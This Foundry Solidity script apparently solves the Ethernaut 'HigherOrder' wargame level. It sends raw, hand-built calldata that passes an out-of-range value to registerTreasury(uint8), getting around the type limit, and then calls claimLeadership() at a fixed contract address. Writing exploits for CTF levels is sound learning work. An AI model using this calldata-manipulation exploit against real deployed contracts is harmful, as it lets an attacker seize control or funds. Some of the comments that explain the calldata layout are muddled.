/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IHigherOrder {
    function claimLeadership() external;
}

contract HigherOrder is Script {
    function run() public {
        vm.startBroadcast();

        // Use cast calldata "registerTreasury(uint8)" 255 | cast pretty-calldata and then from there add one more to make it 100
        bytes
            memory _calldata = hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100";

        // This will resume like this, the first 60 (0x60 which is 96 in decimal) is the dynamic position of the pointer
        // The next 4 is the bytes size of the function selector (4 bytes)
        (bool success, ) = address(0xdaFDC756d0A75C2f817DfB30D60acE4F0ABADdeB)
            .call(_calldata);
        IHigherOrder(0xdaFDC756d0A75C2f817DfB30D60acE4F0ABADdeB)
            .claimLeadership();

        vm.stopBroadcast();
    }
}
